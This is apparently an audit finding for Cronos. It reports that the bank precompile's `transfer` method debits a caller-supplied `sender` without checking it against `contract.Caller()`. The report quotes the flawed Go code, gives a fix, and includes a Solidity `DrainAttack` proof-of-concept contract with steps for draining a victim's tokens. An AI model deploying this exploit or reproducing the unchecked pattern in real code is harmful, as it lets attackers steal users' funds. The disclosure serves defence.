### Title
Unauthorized Native-Token Drain via Unchecked `sender` in Bank Precompile `transfer` — (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `transfer` method accepts the `sender` address as a caller-supplied argument and never verifies that it equals `contract.Caller()`. Any EVM contract can therefore move `evm/<callerContract>` native tokens out of any victim address without that address's authorization.

### Finding Description
In `x/cronos/keeper/precompiles/bank.go`, the `Run` function dispatches to `TransferMethodName`. The denom is derived from the calling contract (`EVMDenom(contract.Caller())`), but the `sender` (the address whose balance is debited) is taken directly from the ABI-decoded call arguments:

```go
sender := args[0].(common.Address)   // attacker-controlled
recipient := args[1].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
...
denom := EVMDenom(contract.Caller())  // evm/<callerContract>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is no guard of the form `require sender == contract.Caller()`. The `mint` and `burn` methods in the same switch block also operate on arbitrary addresses, but those create/destroy supply; `transfer` moves existing user balances between accounts without the source account's consent. [1](#0-0) 

### Impact Explanation
**Critical — unauthorized transfer of native tokens.**

A malicious contract at address `0xA` can call `transfer(victimAddress, attackerAddress, amount)` on the bank precompile. The precompile computes `denom = evm/0xA` and executes `bankKeeper.SendCoins(ctx, victim, attacker, evm/0xA coins)` with no authorization from `victim`. Any user who holds `evm/0xA` tokens — whether acquired through a DEX swap, IBC transfer, or any secondary-market mechanism — loses those tokens unconditionally.

### Likelihood Explanation
The bank precompile is reachable by any deployed EVM contract with no privilege requirement. The attacker only needs to deploy a contract and call the precompile. Users who hold `evm/<contract>` tokens acquired through secondary markets (DEX, IBC, bridge) are silently exposed to a rug-pull by the contract deployer at any time.

### Recommendation
Enforce that the `sender` argument equals `contract.Caller()` before executing the transfer:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

Alternatively, remove the `sender` argument entirely and always use `contract.Caller()` as the source address, consistent with how ERC-20 `transfer` works. [2](#0-1) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract DrainAttack {
    IBankPrecompile constant bank = IBankPrecompile(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<this> tokens to victim (e.g. via a DEX listing)
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain evm/<this> tokens from victim without their consent
    function drain(address victim, uint256 amount) external {
        // sender = victim, but contract.Caller() = address(this)
        // denom  = evm/<address(this)>
        // No authorization check exists in the precompile
        bank.transfer(victim, msg.sender, amount);
    }
}
```

1. Deploy `DrainAttack` at address `0xA`.
2. Call `seedVictim(alice, 1000)` — Alice now holds 1000 `evm/0xA` native tokens.
3. Alice trades on a DEX, paying real CRO for more `evm/0xA` tokens.
4. Attacker calls `drain(alice, aliceBalance)` — all `evm/0xA` tokens are transferred from Alice to the attacker with zero authorization from Alice.

The missing guard is at `x/cronos/keeper/precompiles/bank.go` line 175: `sender` is read from ABI arguments and used directly as `from` in `bankKeeper.SendCoins` without any check against `contract.Caller()`. [3](#0-2) [4](#0-3)
